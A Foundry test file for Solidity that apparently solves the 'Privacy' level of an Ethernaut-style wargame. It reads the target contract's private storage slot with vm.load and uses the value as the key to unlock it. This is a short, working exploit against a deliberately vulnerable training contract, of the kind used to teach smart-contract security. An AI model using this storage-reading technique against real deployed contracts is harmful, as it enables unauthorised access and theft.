// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {PrivacyFactory} from "src/levels/PrivacyFactory.sol";
import {Privacy} from "src/levels/Privacy.sol";

contract PrivacyTest is Test {
    address private attacker = makeAddr("attacker");
    PrivacyFactory private factory;
    Privacy private privacy;

    function setUp() external {
        factory = new PrivacyFactory();
        address privacyAddress = factory.createInstance(attacker);
        privacy = Privacy(privacyAddress);
    }

    function test_PrivacyHack() external {
        bytes32 data = vm.load(address(privacy), bytes32(uint256(5)));
        bytes16 key = bytes16(data);
        privacy.unlock(key);

        bool locked = privacy.locked();
        assertFalse(locked, "PrivacyTest : Failed to unlock the contract_0");

        bool success = factory.validateInstance(
            payable(address(privacy)),
            attacker
        );
        assertTrue(success, "PrivacyTest : Failed to unlock the contract_1");
    }
}
